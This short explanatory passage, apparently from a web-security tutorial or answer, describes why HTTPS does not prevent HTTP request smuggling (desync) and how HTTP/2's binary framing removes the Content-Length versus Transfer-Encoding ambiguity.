HTTPS encrypts the transport but does not change how HTTP request boundaries are parsed after TLS termination. The desync happens at the HTTP parsing layer — both servers terminate TLS and then parse the same HTTP bytes, where the ambiguity exists. HTTP/2 eliminates the ambiguity by using binary framing with explicit stream IDs and length fields that are part of the protocol structure, not HTTP headers. There is no `Content-Length` vs `Transfer-Encoding` choice in HTTP/2 — stream boundaries are defined by the framing layer itself.

---
